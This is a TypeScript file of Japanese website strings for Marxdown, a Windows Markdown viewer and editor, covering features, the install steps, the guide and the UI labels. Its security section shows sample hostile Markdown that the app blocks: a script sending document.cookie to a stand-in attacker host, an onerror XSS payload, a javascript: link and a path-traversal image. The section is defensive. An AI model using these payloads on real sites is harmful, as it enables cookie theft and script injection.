/**
 * サイトの文言（日本語）。表記はアプリの UI の文言の取り決めに合わせる（フォルダー・タスクトレイ・外観 / 配色 など）。
 *
 * 英語版（`en.ts`）はこのオブジェクトと同じ形でなければならない（`Messages` 型で検査する）。
 */
export const ja = {
  meta: {
    siteName: 'Marxdown',
    title: 'Marxdown — Markdown を見る・書くなら、これ。',
    description:
      'ターミナルで marxdown README.md と入力した瞬間に読める、軽くて美しい Markdown ビューアー＆エディター。Windows 10 / 11 向け、無料のオープンソースです。',
    guideSuffix: 'Marxdown ガイド',
  },

  nav: {
    skip: '本文へ移動',
    features: '特徴',
    guide: 'ガイド',
    download: 'ダウンロード',
    github: 'GitHub',
    menu: 'メニュー',
    search: 'ガイドを検索',
    appearance: '外観',
    appearanceOptions: { system: 'システム', light: 'ライト', dark: 'ダーク' },
    language: '言語',
  },

  hero: {
    badge: (version: string) => `v${version} を公開しました`,
    badgeLink: '変更履歴',
    titleLines: ['Markdown を', '見る・書くなら、*これ。*'],
    lead: 'ターミナルで {command} と入力した瞬間に読める、軽くて美しい Markdown ビューアー＆エディター。',
    leadCommand: 'marxdown README.md',
    download: 'Windows 版をダウンロード',
    downloadMeta: (version: string) => `v${version} · Windows 10 / 11（x64）· 無料`,
    guide: '使い方を見る',
    replay: 'もう一度再生',
    terminalTitle: 'Windows PowerShell',
    prompt: 'PS C:\\work\\search-api>',
    commands: ['marxdown README.md', 'marxdown CHANGELOG.md'],
  },

  statement: {
    eyebrow: 'こんなときに',
    // 強調する語は `*` で囲む。スクロールに合わせて前から順に明るくなる。
    lines: [
      'LLM に書かせた*設計書*。リポジトリの *README*。*議事録*。',
      'Markdown を「ちょっと開いて確認したい」場面は、1 日に何十回もあります。',
      'そのたびに IDE の起動を待つ必要はありません。',
    ],
    closing: 'Marxdown は、開いて・読んで・少し直すためのアプリです。',
  },

  speed: {
    eyebrow: '一瞬で開く',
    title: '開くたびに、待たされない。',
    body: '起動後はタスクトレイで待機し、2 回目以降の marxdown は既存のウィンドウにタブで開きます。コマンドを打ったターミナルのプロンプトも、すぐに戻ります。',
    stats: [
      { value: '600', unit: 'ms', label: '初回の起動の目標' },
      { value: '120', unit: 'ms', label: '2 回目以降の目標' },
      { value: '≈0', unit: '%', label: '待機中の CPU 使用率' },
    ],
    tray: 'タスクトレイで待機中',
    tabNote: '既存のウィンドウにタブで開く',
  },

  tour: {
    eyebrow: '読む・書く・探す',
    title: '開いて、読んで、少し直す。',
    steps: [
      {
        id: 'read',
        label: '読む',
        title: '読むためのプレビュー',
        body: '余白・行間・本文幅を整えたタイポグラフィで、長い文書も読みやすく表示します。表・コード・数式・図も、そのまま表示します。',
        chips: [
          '表',
          'シンタックスハイライト',
          '数式（KaTeX）',
          '図（Mermaid）',
          'GitHub のアラート',
          'タスクリスト',
          '脚注',
        ],
      },
      {
        id: 'write',
        label: '書く',
        title: 'キー 1 つで、そのまま編集',
        body: 'Preview・Edit・Split をキー 1 つで切り替えられます。エディターは VS Code と同じ Monaco です。書いた内容は、隣のプレビューにすぐ反映されます。',
        chips: [],
      },
      {
        id: 'format',
        label: '整える',
        title: '書式も、表も、キーボードで',
        body: '太字・リンク・見出し・リストはショートカットで付け外しできます。崩れた表の列幅は、Shift+Alt+F で揃います。',
        chips: [],
      },
      {
        id: 'find',
        label: '探す',
        title: 'フォルダーごと開ける',
        body: 'marxdown docs/ で、フォルダー内のファイル一覧と一緒に開きます。Ctrl+P で名前の一部から探せて、Ctrl+Shift+P のコマンドパレットからはすべての操作を実行できます。',
        chips: [],
      },
    ],
    keys: {
      split: 'Split',
      bold: '太字',
      align: '表の列幅を揃える',
      quickOpen: 'ファイルへ移動',
      commandPalette: 'コマンドパレット',
    },
    quickOpenPlaceholder: 'ファイル名を入力',
    quickOpenQuery: 'cache',
  },

  themes: {
    eyebrow: '自分好みに',
    title: '50 の配色から、しっくりくる 1 枚を。',
    body: 'ライトとダークの切り替えに加えて、組み込みの配色が 50 種類。プレビューとエディターで別々に選べます。CSS ファイルを置けば、自分の配色も追加できます。',
    scheme: '外観',
    schemeLight: 'ライト',
    schemeDark: 'ダーク',
    current: '選択中の配色',
    custom: 'themes フォルダーに CSS を置くだけ',
    defaultName: 'Marxdown',
  },

  typography: {
    eyebrow: '読みやすさ',
    title: '文字の大きさも、行間も、本文幅も。',
    body: '本文とコードのフォント、文字サイズ、行間、本文幅、表の罫線を設定画面で調整できます。変更はすぐにプレビューへ反映されます。',
    fontSize: '文字サイズ',
    lineHeight: '行間',
    maxWidth: '本文幅',
    tableStyle: '表の罫線',
    tableStyles: { lines: '横罫線のみ', grid: '格子', zebra: '縞模様' },
    font: 'フォント',
    fonts: { sans: 'ゴシック', serif: '明朝' },
    reset: '既定に戻す',
  },

  bytes: {
    eyebrow: '安心して保存',
    title: '編集していない箇所は、1 バイトも変わらない。',
    body: '保存しても、手を入れていない行はそのままです。改行コード・BOM・末尾の改行も、開いたときのまま保ちます。ほかのアプリがファイルを書き換えたときは、自動で再読み込みします。',
    chips: ['BOM 付き UTF-8 のまま', 'CRLF のまま', '末尾の改行もそのまま'],
    changed: '変わったバイト',
    total: 'ファイル全体',
    unit: 'バイト',
    before: '保存前',
    after: '保存後',
    edit: { from: '5', to: '3' },
  },

  security: {
    eyebrow: '知らないファイルも',
    title: '自分で書いていない Markdown も、安心して開ける。',
    body: 'LLM が生成したファイルのように、自分で書いていない Markdown を開くことを前提に作っています。何重もの防御で、文書の中身がアプリやパソコンに手を出せないようにしています。',
    file: 'untrusted.md',
    threats: [
      {
        code: '<script>fetch("https://evil.example/?" + document.cookie)</script>',
        verdict: '埋め込まれたスクリプトは実行しない',
      },
      { code: '<img src="x" onerror="alert(1)">', verdict: 'onerror などのイベント属性は取り除く' },
      { code: '[続きを読む](javascript:alert(1))', verdict: '知らない種類のリンクは何もしない' },
      { code: '![](../../Pictures/private.png)', verdict: 'フォルダーの外は、許可しない限り読み込まない' },
    ],
    layers: ['CSP', 'サニタイズ', 'リンクの許可リスト', '読み込む範囲の検証'],
    blocked: '止めました',
    safe: '安全に表示',
  },

  features: {
    eyebrow: 'ほかにも',
    title: 'Markdown のための機能を、ひととおり。',
    items: [
      {
        icon: 'outline',
        title: 'アウトライン',
        body: '見出しの一覧から、読みたい場所へ移動できます。',
        keys: 'Ctrl+Shift+U',
      },
      { icon: 'search', title: 'プレビュー内検索', body: '表示している文書の中を検索できます。', keys: 'Ctrl+F' },
      {
        icon: 'slides',
        title: 'Marp のスライド',
        body: 'marp: true を書いた文書は、スライドとして表示します。',
        keys: '',
      },
      {
        icon: 'export',
        title: 'HTML / PDF に書き出し',
        body: '表示している文書を、そのまま HTML や PDF にできます。',
        keys: '',
      },
      {
        icon: 'reload',
        title: '自動で再読み込み',
        body: 'ほかのアプリがファイルを書き換えると、自動で再読み込みします。',
        keys: '',
      },
      {
        icon: 'files',
        title: 'ファイル操作',
        body: 'ファイル一覧から、新規作成・名前の変更・コピー・ごみ箱への移動ができます。',
        keys: '',
      },
      {
        icon: 'pipe',
        title: '標準入力から開く',
        body: 'コマンドの出力を、そのまま無題の文書として開けます。',
        keys: '',
      },
      {
        icon: 'language',
        title: '日本語と英語',
        body: '画面の表示は日本語と英語に対応しています。既定では Windows の表示言語に合わせます。',
        keys: '',
      },
      {
        icon: 'update',
        title: '自動更新',
        body: '新しいバージョンが出るとアプリ内でお知らせし、ボタン 1 つで入れ替わります。',
        keys: '',
      },
      {
        icon: 'folder',
        title: 'エクスプローラーから',
        body: '.md のダブルクリックでも、フォルダーの右クリックメニューからも開けます。',
        keys: '',
      },
    ],
  },

  cli: {
    eyebrow: 'ターミナルから',
    title: 'いつものターミナルが、入口になる。',
    body: 'cmd.exe / PowerShell / Git Bash のどこから実行しても、プロンプトはすぐに戻ります。',
    examples: [
      { command: 'marxdown README.md', description: 'ファイルを開く' },
      { command: 'marxdown README.md CHANGELOG.md', description: '複数のファイルをまとめて開く' },
      { command: 'marxdown docs/', description: 'フォルダーを開く' },
      { command: 'marxdown -m split notes.md', description: '表示モードを指定して開く' },
      { command: 'llm "設計案を出して" | marxdown -', description: '標準入力の内容を無題の文書として開く' },
    ],
    copy: 'コピー',
    copied: 'コピーしました',
  },

  install: {
    eyebrow: 'はじめる',
    title: 'インストールは 3 ステップ。',
    steps: [
      {
        title: 'ダウンロード',
        body: 'Releases から Marxdown_<バージョン>_x64-setup.exe をダウンロードします。',
      },
      {
        title: '実行する',
        body: '管理者権限は不要です。%LOCALAPPDATA%\\Marxdown にインストールされます。',
      },
      {
        title: 'コマンドを有効にする',
        body: '最後の確認で「はい」を選ぶと、ターミナルから marxdown で開けるようになります。',
      },
    ],
    smartScreen:
      'インストーラーにはコード署名をしていないため、初回の実行時に SmartScreen の警告が表示されます。「詳細情報」→「実行」の順に選ぶと、インストールを続けられます。',
    requirements:
      '動作環境: Windows 10 / 11（x64）。WebView2 ランタイムが必要です（Windows 11 には標準で入っています）。',
    more: 'インストールの詳しい手順',
  },

  cta: {
    title: 'Markdown を、もっと気持ちよく。',
    body: '無料のオープンソースです。いますぐ試せます。',
    download: 'Windows 版をダウンロード',
    github: 'GitHub で見る',
  },

  footer: {
    tagline: 'Markdown を見る・書くなら、これ。',
    product: 'プロダクト',
    guide: 'ガイド',
    community: 'コミュニティ',
    features: '特徴',
    download: 'ダウンロード',
    changelog: '変更履歴',
    issues: '不具合の報告',
    ideas: '機能の提案',
    security: 'セキュリティ',
    source: 'ソースコード',
    license: 'MIT ライセンス',
  },

  guide: {
    title: 'ガイド',
    pages: {
      start: 'はじめに',
      shortcuts: 'キーボードショートカット',
      syntax: '記法',
      settings: '設定',
    },
    descriptions: {
      start:
        'インストール、コマンドラインからの使い方、ファイルの置き場所など、Marxdown を使いはじめるための情報です。',
      shortcuts: 'Marxdown のキーボードショートカットの一覧です。',
      syntax: 'Marxdown が表示できる Markdown の書き方です。左が書き方、右が表示です。',
      settings: '設定画面（Ctrl+,）と同じ並びで、すべての設定項目を説明します。',
    },
    onThisPage: 'このページの内容',
    edit: 'このページの元になったファイル',
    prev: '前へ',
    next: '次へ',
    filter: '絞り込む',
    shortcutFilterPlaceholder: '操作やキーで絞り込む（例: 保存、Ctrl+P）',
    settingFilterPlaceholder: '設定の名前やキーで絞り込む（例: 行間、editor.fontSize）',
    noMatch: '該当する項目はありません',
    source: '書き方',
    result: '表示',
    settingKey: 'キー',
    settingDefault: '既定',
    settingRange: '範囲',
    settingOptions: '選択肢',
    settingEmpty: '（空）',
    copyKey: 'キーをコピー',
    requiresSetting: '設定で有効にすると使えます',
    settingsIntro:
      '設定画面（Ctrl+,）と同じ並びで載せています。settings.json を直接編集するときは、各項目のキー（例: preview.fontSize）を使います。settings.json は、設定画面の「settings.json を開く」から開けます。',
    customThemes: {
      title: '自分の配色を追加する',
      body: [
        'themes フォルダーに置いた .css ファイル 1 つが 1 つの配色になり、設定の「配色」に表示されます。プレビューとエディターのどちらでも選べます。配色の名前は、拡張子を除いたファイル名です（英数字と - _ だけ使えます）。',
        'ファイルには、セレクターを付けずに宣言だけを書きます。ライトとダークで色を変えるときは light-dark() を、一方にだけ対応する配色は color-scheme を使います。組み込みの配色と同じ名前を付けると、組み込みの配色の代わりに使われます。ファイルを保存すると、すぐに反映されます。',
      ],
      location: '置き場所',
      variables: '使える変数',
      groups: {
        surface: '背景',
        text: '文字',
        border: '罫線',
        accent: 'アクセント',
        code: 'コード',
      },
    },
    marpNote: 'スライドの見本',
  },

  palette: {
    placeholder: 'ガイドを検索',
    empty: '見つかりませんでした',
    hint: '↑↓ で選択 · Enter で移動 · Esc で閉じる',
    kinds: { page: 'ページ', shortcut: 'ショートカット', setting: '設定', syntax: '記法', section: '節' },
    open: 'ガイドを検索',
  },

  window: {
    mode: { preview: 'Preview', edit: 'Edit', split: 'Split' },
    encoding: 'UTF-8',
    eol: 'LF',
    chars: (count: number) => `${count.toLocaleString('ja-JP')} 文字`,
    minutes: (count: number) => `約 ${count} 分`,
    sync: 'スクロール同期: オン',
    untitled: '無題',
    explorer: 'エクスプローラー',
    outline: 'アウトライン',
  },
};

type Widen<T> = T extends string
  ? string
  : T extends (...args: infer A) => infer R
    ? (...args: A) => Widen<R>
    : T extends readonly (infer U)[]
      ? Widen<U>[]
      : T extends object
        ? { [K in keyof T]: Widen<T[K]> }
        : T;

/** 文言の形。日本語版から導出する。 */
export type Messages = Widen<typeof ja>;
